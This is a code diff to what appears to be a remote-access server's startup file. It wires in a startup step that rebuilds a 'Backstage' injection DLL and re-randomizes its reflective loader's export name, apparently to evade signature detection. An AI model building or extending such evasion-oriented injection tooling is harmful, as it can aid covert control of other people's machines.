@@ -43,6 +43,7 @@ import { handleUsersRoutes } from "./server/routes/users-routes";
 import { handlePermissionGroupsRoutes } from "./server/routes/permission-groups-routes";
 import { handleWebSocketClose, handleWebSocketMessage, handleWebSocketOpen } from "./server/routes/websocket-lifecycle-routes";
 import { handleWsUpgradeRoutes } from "./server/routes/ws-upgrade-routes";
+import { rebuildBackstageDll } from "./server/backstage-dll-manager";
 import { handleWebrtcRoutes } from "./server/routes/webrtc-routes";
 import { handleRemoteDesktopRecordingRoutes } from "./server/routes/rd-recording-routes";
 import { isAuthorizedAgentRequest } from "./server/agent-auth";
@@ -479,6 +480,14 @@ async function startServer() {
 
   await cleanupFileTransferTempFiles(DATA_DIR);
   logger.info("[filebrowser] cleaned stale transfer temp files on startup");
+
+  // Backstage (BackstageInjection) DLL: if configured, rebuild + re-randomize
+  // the reflective loader export name on startup without blocking the server.
+  if (getConfig().backstageDll.rebuildOnStartup) {
+    rebuildBackstageDll().catch((err) => {
+      logger.warn(`[backstage-dll] startup rebuild failed: ${(err as Error).message}`);
+    });
+  }
   let tls:
     | {
         tlsOptions: { cert?: string; key?: string; ca?: string };
